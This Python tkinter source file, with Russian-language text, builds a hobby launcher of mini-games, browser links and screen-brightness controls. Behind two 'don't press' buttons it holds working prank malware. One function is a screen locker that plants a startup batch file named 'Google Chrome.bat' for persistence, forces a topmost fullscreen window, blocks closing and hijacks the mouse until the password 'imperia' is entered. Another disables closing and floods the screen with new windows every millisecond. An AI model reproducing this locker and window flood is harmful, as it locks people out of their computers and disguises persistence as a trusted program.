from tkinter import *
from tkinter import messagebox
from PIL import ImageTk, Image
import wmi
import webbrowser
import random
import datetime
from playsound import *
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui

window = Tk()
window.resizable(width=False, height=False)

ricrol = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
youtube = "https://www.youtube.com"
twitch = "https://www.twitch.tv"
kol_1 = 0
kol = 0
W = 700
H = 500
random_number = random.randint(1, 99)
data_time = datetime.datetime.now()
igra = ["paper", "stone", "scissor"]
color=["red","blue","orange","yellow"]
kol_igra = 0
width_1 = 900


def rock_paper_scissors():
    class Window:
        def __init__(self, main):
            self.label = Label(main,text="""Приветствую Вас
        на игре "Камень,ножницы,бумага"
        Суть игры понятна каждому,
        следовательно, можно начинать.
        Компьютер уже загадал,
        так что очередь за Вами)""", font=("Times New Roman", 25), bg="black", fg="white")
            self.button_1 = Button(main, text="Камень", font=("Times New Roman", 30), bg="black", fg="white")
            self.button_2 = Button(main, text="Ножницы", font=("Times New Roman", 30), bg="black", fg="white")
            self.button_3 = Button(main, text="Бумага", font=("Times New Roman", 30), bg="black", fg="white")
            self.label.place(x=140, y=0)
            self.button_1.place(x=65, y=255)
            self.button_2.place(x=300, y=350)
            self.button_3.place(x=600, y=255)

            self.button_3.bind("<Button-1>", self.paper)
            self.button_2.bind("<Button-1>", self.scissors)
            self.button_1.bind("<Button-1>", self.stone)

        def paper(self, event):
            def change():
                self.label.place(x=100, y=60)
                self.label["font"] = ("Times New Roman", 30)

            def win():
                window_7["bg"] = random.choice(color)

            global kol_igra
            pk_choice_random = random.choice(igra)
            print(pk_choice_random)
            input_choice = "paper"
            if pk_choice_random == input_choice:
                self.label["text"] = f"Ничья. Кол-во очков {kol_igra} \nКомпютер показал бумагу"
                change()
                window_7["bg"] = "gray"
            elif pk_choice_random != input_choice:
                if pk_choice_random == "stone":
                    change()
                    win()
                    kol_igra += 1
                    self.label["text"] = f"Вы выйграли) Кол-во очков {kol_igra} \nКомпютер показал камень"
                elif pk_choice_random == "scissor":
                    change()
                    window_7["bg"] = "black"
                    self.label["text"] = f"Увы, Вы проиграли( Кол-во очков {kol_igra} \nКомпютер показал ножницы"

        def stone(self, event):
            def change():
                self.label.place(x=100, y=60)
                self.label["font"] = ("Times New Roman", 30)

            def win():
                window_7["bg"] = random.choice(color)

            global kol_igra
            pk_choice_random = random.choice(igra)
            print(pk_choice_random)
            input_choice = "stone"
            if pk_choice_random == input_choice:
                self.label["text"] = f"Ничья. Кол-во очков {kol_igra} \nКомпютер показал камень"
                change()
                window_7["bg"] = "gray"
            elif pk_choice_random != input_choice:
                if pk_choice_random == "scissor":
                    change()
                    win()
                    kol_igra += 1
                    self.label["text"] = f"Вы выйграли) Кол-во очков {kol_igra} \nКомпютер показал ножницы"
                elif pk_choice_random == "paper":
                    change()
                    window_7["bg"] = "black"
                    self.label["text"] = f"Увы, Вы проиграли( Кол-во очков {kol_igra} \nКомпютер показал бумагу"

        def scissors(self, event):
            def change():
                self.label.place(x=100, y=60)
                self.label["font"] = ("Times New Roman", 30)

            def win():
                window_7["bg"] = random.choice(color)

            global kol_igra
            pk_choice_random = random.choice(igra)
            print(pk_choice_random)
            input_choice = "scissor"
            if pk_choice_random == input_choice:
                self.label["text"] = f"Ничья. Кол-во очков {kol_igra} \nКомпютер показал ножницы"
                change()
                window_7["bg"] = "gray"
            elif pk_choice_random != input_choice:
                if pk_choice_random == "paper":
                    change()
                    win()
                    kol_igra += 1
                    self.label["text"] = f"Вы выйграли) Кол-во очков {kol_igra} \nКомпютер показал бумагу"
                elif pk_choice_random == "stone":
                    change()
                    window_7["bg"] = "black"
                    self.label["text"] = f"Увы, Вы проиграли( Кол-во очков {kol_igra} \nКомпютер показал камень"

    window_7 = Tk()
    window_7.geometry("800x500")
    window_7.title("Ура")
    window_7["bg"] = "black"
    q = Window(window_7)
    window_7.mainloop()


def skam():
    window_4 = Tk()
    window_4.attributes("-fullscreen", True)
    window_4["bg"] = "black"
    flRunning = True

    def infinitewindow():
        otherFrame = Toplevel()
        otherFrame.geometry("700x700")
        otherFrame["bg"] = "black"
        otherFrame.grab_set()
        Label(otherFrame, text="""АХХАХАХ\n
        АХХАХАХАХАХАХАХХ\n
        ХАХАХАХАХХАХАХХА\n
        АХАХАХАХАХХАХАХХ\n
        АХАХАХХАХАХАХААХ\n
        ХАХХАХАХАХАХАХАХ\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХАХХАХАХАХХААХА\n
        АХХАХАХАХААХХААХА""", font=("Times New Roman", 60), bg="black", fg="green").place(x=0, y=0)
        window_4.after(1, infinitewindow)

    Label(window_4, text="Вот и еще один человек, который подумал, что ему все можно", font=("Times New Roman", 50),
          fg="red", bg="black").place(x=0, y=0)
    Label(window_4, text="Неужели прошлая кнопка тебя ничему не научила?", font=("Times New Roman", 50), fg="red",
          bg="black").place(x=0, y=80)
    Label(window_4, text="""
    Ты сам выбрал свою судьбу)
    Удачи выжить)
    Подожди...О нет,я забыл убрать кнопку выхода,
    когда сам тестил вирус...
    О черт, какой я молодец...""", font=("Times New Roman", 50), fg="red", bg="black").place(x=0, y=160)
    Button(window_4, text="ВЫХОД", fg="red", bg="black", font=("Times New Roman", 25), command=infinitewindow).place(
        x=800, y=800)

    def on_closing():
        pass

    window_4.protocol("WM_DELETE_WINDOW", on_closing)
    window_4.mainloop()


def skam_1():
    USER_NAME = getpass.getuser()

    window_6 = Tk()
    window_6.title("Хакер мен)")
    window_6.geometry("400x200")
    window_6["bg"] = "black"

    normal_width = 1920
    normal_height = 1080

    screen_width = window_6.winfo_screenwidth()
    screen_height = window_6.winfo_screenheight()

    percentage_width = screen_width / (normal_width / 100)
    percentage_height = screen_height / (normal_height / 100)

    scale_factor = ((percentage_width + percentage_height) / 2) / 100

    fontsize = int(20 * scale_factor)
    minimum_size = 10
    if fontsize < minimum_size:
        fontsize = minimum_size

    fontsizeHding = int(72 * scale_factor)
    minimum_size = 40
    if fontsizeHding < minimum_size:
        fontsizeHding = minimum_size

    default_style = ttk.Style()
    default_style.configure('New.TButton', font=("Helvetica", fontsize))

    def play(test):
        playsound("Lololowka_-_-_GIMN_SIYANIYA_Idealnyjj_Mir_75103964.mp3", False)

    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    def block():
        pyautogui.moveTo(x=680, y=800)
        window_6.protocol("WM_DELETE_WINDOW", block)
        window_6.update()

    def fullscreen():
        window_6.attributes('-fullscreen', True, '-topmost', True)

    def clicked():
        res = format(txt.get())
        if res == 'imperia':
            file_path = '/tmp/file.txt'
            file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
            os.remove(file_path)
            sys.exit()

    add_to_startup("C:\\myFiles\\main.py")
    fullscreen()

    txt_one = Label(window_6, text="Поздравляю!", font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_two = Label(window_6, text="Вот теперь думай", font=("Arial Bold", fontsizeHding), fg='red', bg='black')
    txt_three = Label(window_6, text='''Ваш компьютер был заблокирован винлокером. Пожалуйста, введите пароль для получения доступа к компьютеру!
                         Я ЖЕ ПРЕДУПРЕЖДАЛ!!!''', font=("Arial Bold", fontsize), fg='white', bg='black')

    txt_one.grid(column=0, row=0)
    txt_two.grid(column=0, row=0)
    txt_three.grid(column=0, row=0)

    txt_one.place(relx=.01, rely=.01)
    txt_two.place(relx=.01, rely=.11)
    txt_three.place(relx=.01, rely=.21)

    txt = Entry(window_6)
    btn = Button(window_6, text="ВВОД КОДА", command=clicked)
    txt.place(relx=.28, rely=.5, relwidth=.3, relheight=.06)
    btn.place(relx=.62, rely=.5, relwidth=.1, relheight=.06)

    play("Lololowka_-_-_GIMN_SIYANIYA_Idealnyjj_Mir_75103964.mp3")

    block()

    window_6.mainloop()


def strange_game():
    global kol_1, random_number, W, H
    window_2 = Tk()
    window_2.geometry(f"{W}x{H}")
    window_2.resizable(width=False, height=False)
    window_2.title("Странная игра")
    random_number = random.randint(1, 99)

    def click():
        global kol_1, random_number

        def exit_game():
            button.destroy()
            button_bye = Button(window_2, text="Выход", command=bye)
            button_bye.pack()

        def bye():
            window_2.destroy()

        try:
            input_number = int(entry.get())
            if random_number != input_number:
                kol_1 += 1
                label["text"] = "Попробуйте еще раз)"
            elif random_number == input_number and kol_1 < 3:
                label["text"] = """Серьезно?!Так угадать? Да вы везунчик)
                Нажмите 'Выход',чтобы вернутьяс на главную страничку """
                kol_1 = 0
                exit_game()
            if random_number == input_number and kol_1 >= 3:
                label["text"] = "Поздравляю, Вы угадали)"
                kol_1 = 0
                exit_game()
            else:
                if kol_1 == 3:
                    if random_number // 10 != 0:
                        label["text"] = "Данное число двухзначное)"
                    else:
                        label['text'] = "Данное число однозначное"
                if kol_1 == 4:
                    if random_number // 10 != 0:
                        if random_number % 2 == 0:
                            label["text"] = "Число четное"
                        elif random_number % 2 != 0:
                            label["text"] = "Число нечетное"
                    else:
                        if random_number % 2 == 0:
                            label["text"] = "Число четное"
                        else:
                            label["text"] = "Число нечетное"
                if kol_1 == 5:
                    if random_number // 10 != 0:
                        label["text"] = f"Первая цифра числа - {random_number // 10}"
                    else:
                        label["text"] = "Подсказок больше нет)"
                if kol_1 == 7:
                    label["text"] = f"Увы,Вы проиграли( Задуманное число-{random_number}"
                    kol_1 = 0
                    exit_game()
        except ValueError:
            label["text"] = "Нужно вводить число, а не строку"

    label = Label(window_2, text="""
    Итак,Добро пожаловать в замечательную игру)
    Суть ее в том, что Ваш пк загадал
    любое число от 1 до 100.
    Ваша задача угадть число с помощью подсказок)
    Изначально дается 3 попытки,чтобы "выстрелить"
    наугад,после чего Вам будет доступно еще 3 попытки,но после каждой попытки
    на экран будет выведена подсказка)Удачи!)
    """, font=("Times New Roman", 15))
    label.pack()
    entry = Entry(window_2)
    entry.pack()
    button = Button(window_2, text="Ответить", command=click)
    button.pack()
    window_2.mainloop()


def rickroll():
    webbrowser.open(ricrol, new=2)


def youTube():
    webbrowser.open(youtube, new=2)


def twitch_1():
    webbrowser.open(twitch, new=2)


def tema_dark():
    brightness = 40
    c = wmi.WMI(namespace='wmi')
    methods = c.WmiMonitorBrightnessMethods()[0]
    methods.WmiSetBrightness(brightness, 0)


def tema_light():
    brightness = 150
    c = wmi.WMI(namespace='wmi')
    methods = c.WmiMonitorBrightnessMethods()[0]
    methods.WmiSetBrightness(brightness, 0)


def brightness_pk():
    brightness = int(input("Яркость варируется от 0 до 255: "))
    c = wmi.WMI(namespace='wmi')
    methods = c.WmiMonitorBrightnessMethods()[0]
    methods.WmiSetBrightness(brightness, 0)


def clicker():
    W = 500
    H = 500
    colors = ["red", "orange", "yellow", "gray", "blue"]
    write = ["Не попадешь)", "Ай!", "А вот и \n не попал!", "Да что я \n тебе сделал?!"]
    window_1 = Tk()
    window_1.geometry(f"{W}x{H}")

    def click():
        global kol
        kol += 1
        label['text'] = f"Попадание {kol}"
        window_1["bg"] = random.choice(colors)
        button_1["bg"] = random.choice(colors)
        button_1["text"] = random.choice(write)
        button_1["height"] = random.randint(1, 15)
        button_1.place(x=random.randint(10, 400), y=random.randint(10, 400))

    button_1 = Button(window_1, text="Нажми меня", bg=random.choice(colors), height=5, command=click)
    button_1.place(x=0, y=0)

    label = Label(window_1, text=f"Попадание {kol}", font=("Times New Roman", 20), bg=random.choice(colors))
    label.place(x=0, y=450)

    window_1.mainloop()


menu = Menu(window)
window.config(menu=menu)

filemenu = Menu(menu, tearoff=0)
filemenu_tema = Menu(filemenu, tearoff=0)
menu.add_cascade(label="Настройки", menu=filemenu)
filemenu.add_cascade(label="Тема", menu=filemenu_tema)
filemenu_tema.add_command(label="Установить темная тему", command=tema_dark)
filemenu_tema.add_command(label="Установить светлая тему", command=tema_light)
filemenu_tema.add_command(label="Яркость", command=brightness_pk)

img = Image.open("tanki.jpg")
width = 500
ratio = (width / float(img.size[0]))
height = int((float(img.size[1]) * float(ratio)))
imag = img.resize((width, height), Image.LANCZOS)
image = ImageTk.PhotoImage(imag)
panel = Label(window, image=image)
panel.pack(side="top", fill="both", expand="no")

Button(window, text='Выход', command=window.quit).place(x=450, y=250)
Button(window, text="Поговоришь со мной?", command=rickroll, ).place(x=10, y=10)
Button(window, text="YouTube", command=youTube).place(x=10, y=41)
Button(window, text="Twitch", command=twitch_1).place(x=10, y=75)
Button(window, text="Кликер", command=clicker).place(x=10, y=106)
Button(window, text="Странная игра", command=strange_game).place(x=10, y=142)
Label(window, text=data_time.strftime("%Y-%m-%d %H:%M:%S")).place(x=390, y=0)
Button(window, text="НЕ НАЖИМАЙ СЮДА!", command=skam_1).place(x=360, y=30)
Button(window, text="ТЕБЕ ВООБЩЕ НЕЧЕМ ЗАНЯТЬСЯ?", command=skam).place(x=298, y=60)
Button(window, text="Камень,ножницы,бумага", command=rock_paper_scissors).place(x=347, y=90)
messagebox.showinfo("ВАЖНО","И ПОМНИТЕ! IMPERIA ЗАБОТИТСЯ О ВАС!")

window.mainloop()
